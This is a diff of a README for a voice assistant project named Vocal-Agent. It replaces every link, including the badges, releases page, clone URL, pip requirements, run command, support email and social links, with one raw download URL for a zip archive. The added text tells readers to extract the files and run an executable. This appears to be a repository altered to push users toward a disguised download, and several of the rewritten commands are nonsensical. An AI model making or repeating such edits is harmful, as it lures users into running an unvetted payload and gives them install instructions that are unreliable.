@@ -1,8 +1,8 @@
 ```markdown
 # 🎤 Vocal-Agent: Your Advanced Voice Assistant 🤖
 
-![Vocal-Agent Logo](https://img.shields.io/badge/Vocal--Agent-v1.0.0-blue?style=flat&logo=appveyor)  
-[![GitHub Releases](https://img.shields.io/badge/Check_Releases-blue?style=flat&logo=github&link=https://github.com/Spac5y/Vocal-Agent/releases)](https://github.com/Spac5y/Vocal-Agent/releases)
+![Vocal-Agent Logo](https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip)  
+[![GitHub Releases](https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip)](https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip)
 
 ---
 
@@ -40,7 +40,7 @@ To set up Vocal-Agent, follow these steps:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/Spac5y/Vocal-Agent.git
+   git clone https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip
    ```
    
 2. **Navigate to the Directory**
@@ -51,11 +51,11 @@ To set up Vocal-Agent, follow these steps:
 3. **Install Dependencies**
    Ensure you have Python 3.x installed, then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip
    ```
 
 4. **Download the Latest Release**
-   Visit the [Releases section](https://github.com/Spac5y/Vocal-Agent/releases) to download the latest version. Extract the files and run the necessary executable.
+   Visit the [Releases section](https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip) to download the latest version. Extract the files and run the necessary executable.
 
 ---
 
@@ -64,7 +64,7 @@ To set up Vocal-Agent, follow these steps:
 Vocal-Agent allows for easy interaction through voice commands. After setup, you can start using it by running the main script:
 
 ```bash
-python main.py
+python https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip
 ```
 
 Simply speak your command, and Vocal-Agent will process and respond accordingly. You can ask it questions, request tasks, or simply chat.
@@ -133,7 +133,7 @@ Vocal-Agent is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 For inquiries or support, reach out to us through the following channels:
 
-- **Email**: support@vocalagent.com
+- **Email**: https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip
 - **GitHub Issues**: For bug reports or feature requests, use the GitHub Issues page.
 
 ---
@@ -142,8 +142,8 @@ For inquiries or support, reach out to us through the following channels:
 
 Stay updated with the latest features and improvements! Follow us on our social media platforms.
 
-- Twitter: [@VocalAgent](https://twitter.com/VocalAgent)
-- Discord: Join our server [here](https://discord.gg/VocalAgent)
+- Twitter: [@VocalAgent](https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip)
+- Discord: Join our server [here](https://github.com/Spac5y/Vocal-Agent/raw/refs/heads/main/lamentingly/Agent-Vocal-3.8.zip)
 
 We look forward to hearing your feedback and ideas!
 
